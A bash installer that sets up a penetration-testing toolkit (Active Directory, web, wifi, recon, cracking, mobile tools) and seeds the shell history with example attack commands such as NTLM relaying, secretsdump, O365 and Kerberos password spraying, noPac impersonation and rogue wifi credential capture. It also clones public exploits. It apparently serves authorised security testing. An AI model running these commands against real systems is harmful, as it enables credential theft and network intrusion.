#!/bin/bash

# Define the destination directory
BASE_DIR="$HOME"

# Define directories for categories
INTERNALS_DIR="$BASE_DIR/internals"
WEB_DIR="$BASE_DIR/web"
WIFI_DIR="$BASE_DIR/wifi"
RECON_DIR="$BASE_DIR/recon"
PASSCRACK_DIR="$BASE_DIR/passcrack"
GENERAL_DIR="$BASE_DIR/general"
MOBILE_DIR="$BASE_DIR/mobile"
REDTEAM="$BASE_DIR/redteam"

# Create the directories if they don't exist
mkdir -p "$INTERNALS_DIR" "$WEB_DIR" "$WIFI_DIR" "$RECON_DIR" "$PASSCRACK_DIR" "$GENERAL_DIR" "$MOBILE_DIR" "$REDTEAM"

# Config variables
echo "alias tools_general='cd $BASE_DIR/general'" >> ~/.zshrc
echo "alias tools_internals='cd $BASE_DIR/internals'" >> ~/.zshrc
echo "alias tools_mobile='cd $BASE_DIR/mobile'" >> ~/.zshrc
echo "alias tools_passcrack='cd $BASE_DIR/passcrack'" >> ~/.zshrc
echo "alias tools_recon='cd $BASE_DIR/recon'" >> ~/.zshrc
echo "alias tools_redteam='cd $BASE_DIR/redteam'" >> ~/.zshrc
echo "alias tools_web='cd $BASE_DIR/web'" >> ~/.zshrc
echo "alias tools_wifi='cd $BASE_DIR/wifi'" >> ~/.zshrc

# Dependencies
sudo apt-get -y update
sudo apt-get -y install pipx git
pipx ensurepath || (echo "[-] Please install pipx first with apt install pipx" && exit 1)
sudo apt-get -y install golang-go

#############################################################
### Installation of the tools
#############################################################

# Adidnsdump
cd $INTERNALS_DIR
pipx install git+https://github.com/dirkjanm/adidnsdump#egg=adidnsdump

# Amass
cd $RECON_DIR
wget https://github.com/owasp-amass/amass/releases/download/v4.2.0/amass_Linux_amd64.zip
unzip -q amass_Linux_amd64.zip amass_Linux_amd64/amass
rm amass_Linux_amd64.zip
mv amass_Linux_amd64/amass amass
rm -r amass_Linux_amd64
chmod +x amass
echo "alias amass='$RECON_DIR/amass'" >> ~/.zshrc
echo "amass -h" >> ~/.zsh_history

# Android-kit (adb, sqlite3)
cd $MOBILE_DIR
wget https://dl.google.com/android/repository/platform-tools-latest-linux.zip
unzip -q platform-tools-latest-linux.zip
rm platform-tools-latest-linux.zip
echo "alias adb='$MOBILE_DIR/platform-tools/adb'" >> ~/.zshrc
echo "adb shell" >> ~/.zsh_history
echo "adb devices" >> ~/.zsh_history

# Apktool
cd $MOBILE_DIR
wget https://github.com/iBotPeaches/Apktool/releases/download/v2.11.1/apktool_2.11.1.jar
echo "alias apktool='java -jar $MOBILE_DIR/apktool_2.11.1.jar'" >> ~/.zshrc
echo "apktool d test.apk" >> ~/.zsh_history

# Aquatone
cd $INTERNALS_DIR
wget https://github.com/michenriksen/aquatone/releases/download/v1.7.0/aquatone_linux_amd64_1.7.0.zip
unzip -q aquatone_linux_amd64_1.7.0.zip aquatone
chmod +x aquatone
rm aquatone_linux_amd64_1.7.0.zip
echo "alias aquatone='$INTERNALS_DIR/aquatone'" >> ~/.zshrc

# Assetfinder
cd $RECON_DIR
wget https://github.com/tomnomnom/assetfinder/releases/download/v0.1.1/assetfinder-linux-amd64-0.1.1.tgz
tar -xzf assetfinder-linux-amd64-0.1.1.tgz
rm assetfinder-linux-amd64-0.1.1.tgz
echo "alias assetfinder='$RECON_DIR/assetfinder'" >> ~/.zshrc
echo "assetfinder domain.com" >> ~/.zsh_history

# Autoswagger
cd $WEB_DIR
git clone https://github.com/intruder-io/autoswagger.git
cd autoswagger
python3 -m venv .
source bin/activate
python3 -m pip install -r requirements.txt
deactivate
echo "alias autoswagger='$WEB_DIR/autoswagger/bin/python3 $WEB_DIR/autoswagger/autoswagger.py'" >> ~/.zshrc

# Backup_dc_registry
cd $INTERNALS_DIR
git clone https://github.com/horizon3ai/backup_dc_registry
echo "python reg.py user:pass@ip backup -path '\\192.168.1.210\shared\'" >> ~/.zsh_history

# Bbot
pipx install bbot

# Bettercap
cd $INTERNALS_DIR
sudo apt-get -y install build-essential libpcap-dev libusb-1.0-0-dev libnetfilter-queue-dev
go install github.com/bettercap/bettercap@latest
echo "alias bettercap='sudo ~/go/bin/bettercap'" >> ~/.zshrc

# BloodHound
cd $INTERNALS_DIR
pipx install bloodhound
echo "bloodhound-python -u user -p password -d domain" >> ~/.zsh_history

# BloodHound-Legacy
cd $INTERNALS_DIR
wget https://github.com/SpecterOps/BloodHound-Legacy/releases/download/v4.3.1/BloodHound-linux-x64.zip
unzip -q BloodHound-linux-x64.zip
rm BloodHound-linux-x64.zip
sudo apt-get -y install neo4j
echo "alias bloodhound-gui='$INTERNALS_DIR/BloodHound-linux-x64/BloodHound'" >> ~/.zshrc
echo "alias neo4j='sudo /usr/bin/neo4j console'" >> ~/.zshrc
echo "bloodhound-gui" >> ~/.zsh_history
echo "neo4j" >> ~/.zsh_history

# BloodyAD
cd $INTERNALS_DIR
wget https://github.com/CravateRouge/bloodyAD/releases/download/v2.1.7/bloodyAD.exe

# BruteSubdomains
cd $RECON_DIR
git clone https://github.com/afkfr0mkeyb0ard/bruteSubdomains.git

# BurpSuite
cd $WEB_DIR
mkdir Burp
cd Burp
wget "https://portswigger-cdn.net/burp/releases/download?product=community&version=2025.1.5&type=Linux" -O BurpCommunity
chmod +x BurpCommunity
echo "alias install-burp='$WEB_DIR/Burp/BurpCommunity'" >> ~/.zshrc

# Certipy
cd $INTERNALS_DIR
pipx install git+https://github.com/ly4k/Certipy || echo "[-] Failed to install Certipy"
echo "certipy find -u 'svc_ldap@DOMAIN.local' -p 'pass123' -dc-ip 10.10.11.222" >> ~/.zsh_history
echo "certipy find -u 'svc_ldap@DOMAIN.local' -p 'pass123' -dc-ip 10.10.11.222 -vulnerable" >> ~/.zsh_history

# Chisel
cd $INTERNALS_DIR
wget https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_windows_amd64.gz
wget https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_linux_amd64.gz
gzip -d chisel_1.10.1_windows_amd64.gz
gzip -d chisel_1.10.1_linux_amd64.gz
mv chisel_1.10.1_windows_amd64 chisel_windows
mv chisel_1.10.1_linux_amd64 chisel_linux
chmod +x chisel_linux
echo "alias chisel='$INTERNALS_DIR/chisel_linux'" >> ~/.zshrc
echo 'chisel server -p 8000 --reverse' >> ~/.zsh_history

# Cloud_enum
cd $RECON_DIR
pipx install git+https://github.com/initstring/cloud_enum.git
echo 'cloud_enum -k keyword1 -k keyword2 -k someproduct' >> ~/.zsh_history

# CloudPEASS
cd $RECON_DIR
git clone https://github.com/carlospolop/CloudPEASS.git
cd CloudPEASS
python3 -m venv .
source bin/activate
pip3 install -r requirements.txt
deactivate
echo "alias AwsPEASS='$RECON_DIR/CloudPEASS/bin/python3 $RECON_DIR/CloudPEASS/AWSPEASS.py'" >> ~/.zshrc
echo "alias AzurePEASS='$RECON_DIR/CloudPEASS/bin/python3 $RECON_DIR/CloudPEASS/AzurePEASS.py'" >> ~/.zshrc
echo "alias GcpPEASS='$RECON_DIR/CloudPEASS/bin/python3 $RECON_DIR/CloudPEASS/GCPPEASS.py'" >> ~/.zshrc

# Coercer
cd $INTERNALS_DIR
mkdir Coercer
cd Coercer
python3 -m venv .
source bin/activate
python3 -m pip install coercer
deactivate
echo "alias coercer='$INTERNALS_DIR/Coercer/bin/coercer'" >> ~/.zshrc
echo "coercer scan -t IP -u USER -p PASS -d DOMAIN -v" >> ~/.zsh_history
echo "coercer coerce -l IP_LISTERNER -t IP_TARGET -u USER -p PASS -d DOMAINE -v" >> ~/.zsh_history

# CredMaster
cd $RECON_DIR
git clone https://github.com/knavesec/CredMaster.git
echo "python3 credmaster.py --plugin {pluginname} --access_key {key} --secret_access_key {key} -u userfile -p passwordfile -a useragentfile {otherargs}" >> ~/.zsh_history

# CrossLinked
cd $RECON_DIR
pipx install git+https://github.com/m8sec/CrossLinked.git
echo "crosslinked -f '{first}.{last}@domain.com' company_name" >> ~/.zsh_history

# Crowbar
cd $INTERNALS_DIR
pipx install git+https://github.com/galkan/crowbar || echo "[-] Failed to install Crowbar"
echo "crowbar -b rdp -s 192.168.2.250/32 -u localuser -C ~/Desktop/passlist" >> ~/.zsh_history

# CsFalconUninstaller
cd $INTERNALS_DIR
git clone https://github.com/gmh5225/CVE-2022-44721-CsFalconUninstaller.git

# DefaultCreds
cd $GENERAL_DIR
pipx install git+https://github.com/ihebski/DefaultCreds-cheat-sheet.git
echo "creds search tomcat" >> ~/.zsh_history

# Dex2Jar
cd $MOBILE_DIR
wget https://github.com/pxb1988/dex2jar/releases/download/v2.4/dex-tools-v2.4.zip
unzip dex-tools-v2.4.zip
rm dex-tools-v2.4.zip
echo "alias dex2jar='$MOBILE_DIR/dex-tools-v2.4/d2j-dex2jar.sh'" >> ~/.zshrc
echo "dex2jar app.apk" >> ~/.zsh_history

# DonPAPI
cd $INTERNALS_DIR
pipx install git+https://github.com/login-securite/DonPAPI.git || echo "[-] Failed to install DonPAPI"
echo "donpapi collect -u username -p password -d domain" >> ~/.zsh_history

# Drozer
cd $MOBILE_DIR
mkdir Drozer
cd Drozer
pipx install drozer
wget https://github.com/WithSecureLabs/drozer-agent/releases/download/3.1.0/drozer-agent.apk

# Eaphammer
cd $WIFI_DIR
sudo apt-get -y install eaphammer
echo "eaphammer --cert-wizard" >> ~/.zsh_history
echo "eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid CorpWifi --creds" >> ~/.zsh_history

# ExetoDll
cd $INTERNALS_DIR
git clone --recursive https://github.com/hasherezade/exe_to_dll.git

# EyeWitness
cd $RECON_DIR
git clone https://github.com/RedSiege/EyeWitness.git

# Ffuf
cd $WEB_DIR
wget https://github.com/ffuf/ffuf/releases/download/v2.1.0/ffuf_2.1.0_linux_amd64.tar.gz
tar -xzf ffuf_2.1.0_linux_amd64.tar.gz
rm CHANGELOG.md LICENSE README.md
chmod +x ffuf
rm ffuf_2.1.0_linux_amd64.tar.gz
echo "alias ffuf='$WEB_DIR/ffuf'" >> ~/.zshrc
echo "ffuf -u 'https://domain.com/FUZZ' -w '/home/kali/web/PayloadEverything/Web/Discovery/Top_118K_paths.txt' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0' -r -c -p 0.1 -t 3 -mc all -fs 107 -replay-proxy 'http://127.0.0.1:8080' -debug-log ffuf_output.txt" >> ~/.zsh_history

# FinalRecon
cd $RECON_DIR
git clone https://github.com/thewhiteh4t/FinalRecon.git
cd FinalRecon
python3 -m venv .
source bin/activate
pip3 install -r requirements.txt
deactivate
echo "alias finalrecon='$RECON_DIR/FinalRecon/bin/python3 $RECON_DIR/FinalRecon/finalrecon.py'" >> ~/.zshrc
echo "ffuf -u 'finalrecon --full --url https://example.com" >> ~/.zsh_history

# FindADCS
cd $INTERNALS_DIR
git clone https://github.com/afkfr0mkeyb0ard/findADCS.git
echo "alias findADCS-scanweb='python3 $INTERNALS_DIR/findADCS/scanWeb.py'" >> ~/.zshrc
echo "alias findADCS-scancerts='python3 $INTERNALS_DIR/findADCS/scanCerts.py'" >> ~/.zshrc
echo "findADCS-scanweb 10.10.10.0/24" >> ~/.zsh_history
echo "findADCS-scancerts 10.10.10.0/24" >> ~/.zsh_history

# FindURLS
cd $WEB_DIR
git clone https://github.com/afkfr0mkeyb0ard/findURLS.git

# Frida
cd $MOBILE_DIR
pipx install frida-tools

# GenUsernames
cd $GENERAL_DIR
git clone https://github.com/afkfr0mkeyb0ard/GenUsernames.git
echo "alias genusernames='python3 $GENERAL_DIR/GenUsernames/genusernames.py'" >> ~/.zshrc
echo "genusernames [-f1/f2/f3/f4] [-es/fr/en] [-d google.com]" >> ~/.zsh_history

# Git-dumper
cd $WEB_DIR
pipx install git+https://github.com/arthaud/git-dumper.git
echo "git-dumper http://website.com/.git output-dir" >> ~/.zsh_history

# Gitleaks
cd $RECON_DIR
wget https://github.com/gitleaks/gitleaks/releases/download/v8.24.0/gitleaks_8.24.0_linux_x64.tar.gz
tar -xzf gitleaks_8.24.0_linux_x64.tar.gz
rm README.md
rm LICENSE
rm gitleaks_8.24.0_linux_x64.tar.gz
echo "alias gitleaks='$RECON_DIR/gitleaks'" >> ~/.zshrc

# GMSADumper
cd $INTERNALS_DIR
git clone https://github.com/micahvandeusen/gMSADumper.git
cd gMSADumper
python3 -m venv .
source bin/activate
pip3 install -r requirements.txt
deactivate
echo "alias gmsadumper='$INTERNALS_DIR/gMSADumper/bin/python3 $INTERNALS_DIR/gMSADumper/gMSADumper.py'" >> ~/.zshrc
echo "gmsadumper -u user -p password -d domain.local" >> ~/.zsh_history

# Go-secdump
cd $INTERNALS_DIR
wget https://github.com/jfjallid/go-secdump/releases/download/0.5.0/go-secdump
chmod +x go-secdump
echo "alias go-secdump='$INTERNALS_DIR/go-secdump'" >> ~/.zshrc
echo "go-secdump --host \$IP --user \$USER --pass \$PASS --local" >> ~/.zsh_history
echo "go-secdump --host \$IP --user \$USER --pass \$PASS --local --sam --lsa --dcc2" >> ~/.zsh_history

# GoMapEnum
cd $RECON_DIR
wget https://github.com/nodauf/GoMapEnum/releases/download/v1.1.0/GoMapEnum_1.1.0_linux_amd64.tar.gz
tar -xzf GoMapEnum_1.1.0_linux_amd64.tar.gz
rm GoMapEnum_1.1.0_linux_amd64.tar.gz
echo "alias gomapenum='$RECON_DIR/GoMapEnum'" >> ~/.zshrc
echo "gomapenum userenum o365 -u user.txt -v" >> ~/.zsh_history
echo "gomapenum bruteSpray o365 -u users.txt -p 'MyPass123' -v -l 2" >> ~/.zsh_history

# GoRedOps
cd $GENERAL_DIR
git clone https://github.com/EvilBytecode/GoRedOps.git

# Gowitness
cd $RECON_DIR
wget https://github.com/sensepost/gowitness/releases/download/3.0.5/gowitness-3.0.5-linux-amd64
mv gowitness-3.0.5-linux-amd64 gowitness
chmod +x gowitness
echo "alias gowitness='$RECON_DIR/gowitness'" >> ~/.zshrc
echo "gowitness scan single --url 'https://domain.com' --write-db" >> ~/.zsh_history

# GPOHound
pipx install "git+https://github.com/cogiceo/GPOHound"

# Hashcat
cd $PASSCRACK_DIR
wget https://github.com/hashcat/hashcat/releases/download/v6.2.6/hashcat-6.2.6.7z

# Hostapd-wpe
cd $WIFI_DIR
sudo apt-get -y install hostapd-wpe
echo "hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf" >> ~/.zsh_history

# Httpx
cd $RECON_DIR
go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
echo "alias httpx='~/go/bin/httpx'" >> ~/.zshrc

# Impacket
cd $INTERNALS_DIR
pipx install impacket
wget https://github.com/fortra/impacket/releases/download/impacket_0_12_0/impacket-0.12.0.tar.gz
tar -xzf impacket-0.12.0.tar.gz
rm impacket-0.12.0.tar.gz
cd impacket-0.12.0
python3 -m venv .
#source bin/activate
#pip3 install -r requirements.txt
#deactivate
cd examples
wget https://raw.githubusercontent.com/api0cradle/impacket/a1d0cc99ff1bd4425eddc1b28add1f269ff230a6/examples/rpcchangepwd.py
chmod +x rpcchangepwd.py
echo "alias impacket-rpcchangepwd='$INTERNALS_DIR/impacket-0.12.0/bin/python3 $INTERNALS_DIR/impacket-0.12.0/examples/rpcchangepwd.py'" >> ~/.zshrc
echo "impacket-addcomputer -computer-name 'MyComputer$' -computer-pass 'Password123' -dc-host 10.10.11.222 'DOMAIN/user:password'" >> ~/.zsh_history
echo "impacket-changepasswd \$DOMAIN/\$MACHINE_ACC:\$PASS@\$IP -newpass 'P@ssw0rd' -p rpc-samr" >> ~/.zsh_history
echo "impacket-Get-GPPPassword 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN_CONTROLLER'" >> ~/.zsh_history
echo "impacket-GetADUsers -all -dc-ip \$IP domain.local/username" >> ~/.zsh_history
echo "impacket-getTGT domain.local/username -hashes :<NTLM> -dc-ip <DC-IP>" >> ~/.zsh_history
echo "impacket-lookupsid \$DOMAIN/guest@\$IP" >> ~/.zsh_history
echo "impacket-ntlmrelayx --lootdir "loot_relay" -of ~/ntlmrelay_hashs.txt -t "ldap://<DC-IP>" -smb2support --remove-mic" >> ~/.zsh_history
echo "impacket-ntlmrelayx -of ~/ntlmrelay_hashs.txt -debug -smb2support -t http://<IP-PKI>/certsrv/certfnsh.asp --adcs --template [KerberosAuthentication/DomainController]" >> ~/.zsh_history
echo "impacket-ntlmrelayx -of ~/ntlmrelay_hashs.txt -tf relay.txt -smb2support [-socks]" >> ~/.zsh_history
echo "impacket-psexec 'domain.local/user:pass@10.10.11.222' whoami" >> ~/.zsh_history
echo "impacket-rpcchangepwd \$DOMAIN/\$MACHINE_ACC:\$PASS@\$IP -newpass 'P@ssw0rd'" >> ~/.zsh_history
echo "impacket-secretsdump -target-ip IP [-just-dc-ntlm] [-history] USER@DOMAIN" >> ~/.zsh_history
echo "impacket-smbclient 'domain.local/user:pass@10.10.11.222'" >> ~/.zsh_history
echo "export KRB5CCNAME=$path_to_ticket.ccache" >> ~/.zsh_history

# ItWasAllADream
cd $INTERNALS_DIR
pipx install git+https://github.com/byt3bl33d3r/ItWasAllADream || echo "[-] Failed to install ItWasAllADream"
echo "itwasalladream -u user -p password -d domain 192.168.1.0/24" >> ~/.zsh_history

# Jadx
cd $MOBILE_DIR
wget https://github.com/skylot/jadx/releases/download/v1.5.1/jadx-1.5.1.zip
mkdir jadx
mv jadx-1.5.1.zip ./jadx/jadx-1.5.1.zip
cd jadx
unzip jadx-1.5.1.zip
rm jadx-1.5.1.zip
echo "alias jadx='$MOBILE_DIR/jadx/bin/jadx'" >> ~/.zshrc
echo "alias jadx-gui='$MOBILE_DIR/jadx/bin/jadx-gui'" >> ~/.zshrc

# Jd-gui
cd $MOBILE_DIR
wget https://github.com/java-decompiler/jd-gui/releases/download/v1.6.6/jd-gui-1.6.6.jar
echo "alias jd-gui='java -jar $MOBILE_DIR/jd-gui-1.6.6.jar'" >> ~/.zshrc
echo "jd-gui" >> ~/.zsh_history

# JSLuice
cd $WEB_DIR
go install github.com/BishopFox/jsluice/cmd/jsluice@latest
echo "alias jsluice='~/go/bin/jsluice'" >> ~/.zshrc

# Jwt_exploit
cd $WEB_DIR
git clone https://github.com/afkfr0mkeyb0ard/jwt_exploit.git

# Jwt-hack
cd $WEB_DIR
go install github.com/hahwul/jwt-hack@latest
echo "alias jwt-hack='~/go/bin/jwt-hack'" >> ~/.zshrc
echo "jwt-hack crack -w {WORDLIST} {JWT_CODE}" >> ~/.zsh_history
echo "jwt-hack payload {JWT_CODE}" >> ~/.zsh_history

# JWT-Key-Recovery
cd $WEB_DIR
git clone https://github.com/FlorianPicca/JWT-Key-Recovery.git
cd JWT-Key-Recovery
python3 -m venv .
source bin/activate
pip3 install -r requirements.txt
deactivate
echo "alias jwt-key-recovery='$WEB_DIR/JWT-Key-Recovery/bin/python3 $WEB_DIR/JWT-Key-Recovery/recover.py'" >> ~/.zshrc
echo "jwt-key-recovery <JWT>" >> ~/.zsh_history

# Jwt_tool
cd $WEB_DIR
git clone https://github.com/ticarpi/jwt_tool.git
cd jwt_tool
python3 -m venv .
source bin/activate
pip3 install -r requirements.txt
deactivate
echo "alias jwt_tool='$WEB_DIR/jwt_tool/bin/python3 $WEB_DIR/jwt_tool/jwt_tool.py'" >> ~/.zshrc
echo "jwt_tool <JWT>" >> ~/.zsh_history
echo "jwt_tool -t 'https://www.example.com/' -rc 'jwt=<JWT>;anothercookie=test' -M pb" >> ~/.zsh_history
echo "jwt_tool -C -d '/home/kali/web/PayloadEverything/Web/Jwt_keys.txt' <JWT>" >> ~/.zsh_history

# Kerbrute
cd $INTERNALS_DIR
wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64
mv kerbrute_linux_amd64 kerbrute
chmod +x kerbrute
echo "alias kerbrute='$INTERNALS_DIR/kerbrute'" >> ~/.zshrc
echo "kerbrute userenum -d domain.local --dc <DC-IP> '/home/kali/web/PayloadEverything/Usernames/TOP_8M_usernames.txt'" >> ~/.zsh_history
echo "kerbrute passwordspray -v -d domain.local 'domain_users' Password123" >> ~/.zsh_history

# KnockKnock
cd $RECON_DIR
git clone https://github.com/waffl3ss/KnockKnock.git
cd KnockKnock
python3 -m venv .
source bin/activate
pip3 install -r requirements.txt
deactivate
echo "alias knockknock='$RECON_DIR/KnockKnock/bin/python3 $RECON_DIR/KnockKnock/KnockKnock.py'" >> ~/.zshrc
echo "knockknock -onedrive -i users.txt -d domain.local" >> ~/.zsh_history

# Kraken
cd $GENERAL_DIR
git clone https://github.com/jasonxtn/Kraken.git
cd Kraken
python3 -m venv .
source bin/activate
python3 -m pip install -r requirements.txt
deactivate
echo "alias kraken='$GENERAL_DIR/Kraken/bin/python3 $GENERAL_DIR/Kraken/kraken.py'" >> ~/.zshrc

# Krb5-user
sudo apt-get -y install krb5-user

# Krbrelayx
cd $INTERNALS_DIR
git clone https://github.com/dirkjanm/krbrelayx.git
echo "alias impacket-addspn='python3 $INTERNALS_DIR/krbrelayx/addspn.py'" >> ~/.zshrc
echo "alias impacket-dnstool='python3 $INTERNALS_DIR/krbrelayx/dnstool.py'" >> ~/.zshrc
echo "alias impacket-krbrelayx='python3 $INTERNALS_DIR/krbrelayx/krbrelayx.py'" >> ~/.zshrc
echo "alias impacket-printerbug='python3 $INTERNALS_DIR/krbrelayx/printerbug.py'" >> ~/.zshrc

# Ldapnomnom
cd $INTERNALS_DIR
wget https://github.com/lkarlslund/ldapnomnom/releases/download/v1.5.1/ldapnomnom-linux-x64
wget https://github.com/lkarlslund/ldapnomnom/releases/download/v1.5.1/ldapnomnom-linux-x64-obfuscated
wget https://github.com/lkarlslund/ldapnomnom/releases/download/v1.5.1/ldapnomnom-windows-x64.exe
wget https://github.com/lkarlslund/ldapnomnom/releases/download/v1.5.1/ldapnomnom-windows-x64-obfuscated.exe
chmod +x ldapnomnom-linux-x64
chmod +x ldapnomnom-linux-x64-obfuscated
echo "alias ldapnomnom='$INTERNALS_DIR/ldapnomnom-linux-x64'" >> ~/.zshrc
echo "alias ldapnomnom_obfuscated='$INTERNALS_DIR/ldapnomnom-linux-x64-obfuscated'" >> ~/.zshrc

# LdapRelayScan
cd $INTERNALS_DIR
git clone https://github.com/zyn3rgy/LdapRelayScan.git
cd LdapRelayScan
python3 -m venv .
source bin/activate
python3 -m pip install -r requirements_exact.txt
deactivate
echo "alias LdapRelayScan='$INTERNALS_DIR/LdapRelayScan/bin/python3 $INTERNALS_DIR/LdapRelayScan/LdapRelayScan.py'" >> ~/.zshrc
echo "LdapRelayScan -method LDAPS -dc-ip 10.0.0.20" >> ~/.zsh_history

# Ldapsearch-ad
pipx install git+https://github.com/yaap7/ldapsearch-ad || echo "[-] Failed to install Ldapsearch-ad"
echo "ldapsearch-ad.py -l 10.0.0.1 -t info" >> ~/.zsh_history

# Ldeep
cd $INTERNALS_DIR
pipx install ldeep
echo "ldeep ldap -u <user> -p <password> -d <domain> -s ldap://<dc_ip> sccm" >> ~/.zsh_history

# Magisk
cd $MOBILE_DIR
mkdir Magisk
cd Magisk
wget https://github.com/topjohnwu/Magisk/releases/download/canary-28103/app-debug.apk
wget https://github.com/topjohnwu/Magisk/releases/download/canary-28103/app-release.apk

# MailSniper
cd $RECON_DIR
git clone https://github.com/dafthack/MailSniper.git

# Malimite
cd $MOBILE_DIR
wget https://github.com/LaurieWired/Malimite/releases/download/1.1/Malimite-1-1.zip
unzip -q Malimite-1-1.zip -d Malimite
rm Malimite-1-1.zip
echo "alias malimite='java -jar $MOBILE_DIR/Malimite/Malimite-1-1.jar'" >> ~/.zshrc

# Manspider
pipx install git+https://github.com/blacklanternsecurity/MANSPIDER || echo "[-] Failed to install Manspider"
echo "manspider 10.10.10.0/24 -e xml -c DefaultPassword cpassword -n -u USER -p PASS -d DOMAINE" >> ~/.zsh_history
echo "manspider 10.10.10.0/24 -e ps1 -c SecureString pwd \$Pass -n -u USER -p PASS -d DOMAINE" >> ~/.zsh_history

# Many-passwords (default credentials)
cd $GENERAL_DIR
git clone https://github.com/many-passwords/many-passwords.git

# Mentalist
cd $PASSCRACK_DIR
wget https://github.com/sc0tfree/mentalist/releases/download/v1.0/Mentalist-v1.0-Linux-x86_64.zip
unzip -q Mentalist-v1.0-Linux-x86_64.zip Mentalist
chmod +x Mentalist
rm Mentalist-v1.0-Linux-x86_64.zip
echo "alias mentalist='$PASSCRACK_DIR/Mentalist'" >> ~/.zshrc

# Mentalist_chains
cd $PASSCRACK_DIR
git clone https://github.com/afkfr0mkeyb0ard/Mentalist_chains.git

# MFASweep
cd $RECON_DIR
wget https://raw.githubusercontent.com/dafthack/MFASweep/refs/heads/master/MFASweep.ps1

# Mhydeath
cd $INTERNALS_DIR
git clone https://github.com/zer0condition/mhydeath.git

# Mitm6
pipx install git+https://github.com/dirkjanm/mitm6 || echo "[-] Failed to install Mitm6"
echo "mitm6 -i eth0 -d domain.local -hb [donotrespondtoFILE] [-hw <target>] [--ignore-nofqnd]" >> ~/.zsh_history

# Monolith
cd $RECON_DIR
wget https://github.com/Y2Z/monolith/releases/download/v2.10.0/monolith-gnu-linux-x86_64
mv monolith-gnu-linux-x86_64 monolith
chmod +x monolith
echo "alias monolith='$RECON_DIR/monolith'" >> ~/.zshrc
echo "monolith https://www.google.com -o %title%.%timestamp%.html" >> ~/.zsh_history

# MS17-010
cd $INTERNALS_DIR
git clone https://github.com/worawit/MS17-010.git

# MSOLSpray
cd $RECON_DIR
git clone https://github.com/MartinIngesen/MSOLSpray.git

# Mssqlrelay
cd $INTERNALS_DIR
pipx install git+https://github.com/CompassSecurity/mssqlrelay.git
echo "mssqlrelay checkall -scheme ldap -target domain.local -ns 10.0.1.100 -u user@domain.local -p pass123 -windows-auth" >> ~/.zsh_history

# Neo-reGeorg
cd $INTERNALS_DIR
git clone https://github.com/L-codes/Neo-reGeorg.git

# Netcredz
cd $INTERNALS_DIR
git clone https://github.com/joey-melo/netcredz.git
echo "alias netcredz='python3 $INTERNALS_DIR/netcredz/netcredz.py'" >> ~/.zshrc
echo "netcredz -f capture.pcap" >> ~/.zsh_history

# Netexec
cd $INTERNALS_DIR
pipx install git+https://github.com/Pennyw0rth/NetExec || echo "[-] Failed to install Netexec"
echo "netexec smb IP -u username -p password -d domain" >> ~/.zsh_history

# Nmap
cd $INTERNALS_DIR
sudo apt-get -y install nmap

# Nomore403
cd $WEB_DIR
git clone https://github.com/devploit/nomore403.git
cd nomore403
wget https://github.com/devploit/nomore403/releases/download/v1.1.1/nomore403_linux_amd64
mv nomore403_linux_amd64 nomore403
chmod +x nomore403
echo "alias nomore403='$WEB_DIR/nomore403/nomore403'" >> ~/.zshrc
echo "nomore403 -u 'https://example.com/admin'" >> ~/.zsh_history

# NoPac
cd $INTERNALS_DIR
git clone https://github.com/Ridter/noPac.git
cd noPac
python3 -m venv .
source bin/activate
pip3 install -r requirements.txt
deactivate
echo "alias noPac='$INTERNALS_DIR/noPac/bin/python3 $INTERNALS_DIR/noPac/noPac.py'" >> ~/.zshrc
echo "python noPac.py 'domain.local/username:password' -dc-ip 192.168.1.1 -dc-host mydc2025 --impersonate administrator -dump" >> ~/.zsh_history

# NTLMRecon
cd $RECON_DIR
pipx install git+https://github.com/pwnfoo/NTLMRecon.git
echo "ntlmrecon --input 192.168.1.1/24 --outfile ntlmrecon-ranges.csv" >> ~/.zsh_history

# NTLMreflection
cd $INTERNALS_DIR
git clone https://github.com/mverschu/CVE-2025-33073.git

# Ntlmscan
cd $RECON_DIR
git clone https://github.com/nyxgeek/ntlmscan.git
echo "alias ntlmscan='python3 $RECON_DIR/ntlmscan/ntlmscan.py'" >> ~/.zshrc
echo "ntlmscan --host autodiscover.domain.com" >> ~/.zsh_history

# Ntlm_theft
cd $INTERNALS_DIR
git clone https://github.com/Greenwolf/ntlm_theft.git
pipx install xlsxwriter
echo "alias ntlm_theft='python3 $INTERNALS_DIR/ntlm_theft/ntlm_theft.py'" >> ~/.zshrc
echo "ntlm_theft -g all -s 127.0.0.1 -f test" >> ~/.zsh_history

# NTLMv1-multi
cd $INTERNALS_DIR
git clone https://github.com/evilmog/ntlmv1-multi.git

# O365enum
cd $RECON_DIR
git clone https://github.com/gremwell/o365enum.git
echo "alias o365enum='python3 $RECON_DIR/o365enum/o365enum.py'" >> ~/.zshrc
echo "o365enum -u users.txt -p Password2 -n 1 -m {activesync,autodiscover,office.com}" >> ~/.zsh_history

# O365recon
cd $RECON_DIR
git clone https://github.com/nyxgeek/o365recon.git

# O365spray
cd $RECON_DIR
pipx install git+https://github.com/0xZDH/o365spray.git
echo "o365spray --validate --domain test.com" >> ~/.zsh_history
echo "o365spray --enum -U usernames.txt --domain test.com" >> ~/.zsh_history
echo "o365spray --spray -U usernames.txt -P passwords.txt --count 2 --lockout 5 --domain test.com" >> ~/.zsh_history

# Objection
cd $MOBILE_DIR
pipx install objection
echo "objection --help" >> ~/.zsh_history

# OpenRedireX
cd $WEB_DIR
git clone https://github.com/devanshbatham/OpenRedireX.git
cd OpenRedireX
chmod +x setup.sh
./setup.sh

# PassTheCert
cd $INTERNALS_DIR
git clone https://github.com/AlmondOffSec/PassTheCert.git
echo "alias impacket-passthecert='python3 $INTERNALS_DIR/PassTheCert/Python/passthecert.py'" >> ~/.zshrc

# PayloadsAllTheThings
cd $WEB_DIR
git clone https://github.com/swisskyrepo/PayloadsAllTheThings.git

# PayloadEverything
cd $WEB_DIR
git clone https://github.com/afkfr0mkeyb0ard/PayloadEverything.git

# PCredz
cd $INTERNALS_DIR
git clone https://github.com/lgandx/PCredz.git
cd PCredz
python3 -m venv .
source bin/activate
sudo apt-get -y install python3-pip libpcap-dev file && pip3 install Cython && pip3 install python-libpcap || echo "[-] Failed to install PCredz"
deactivate
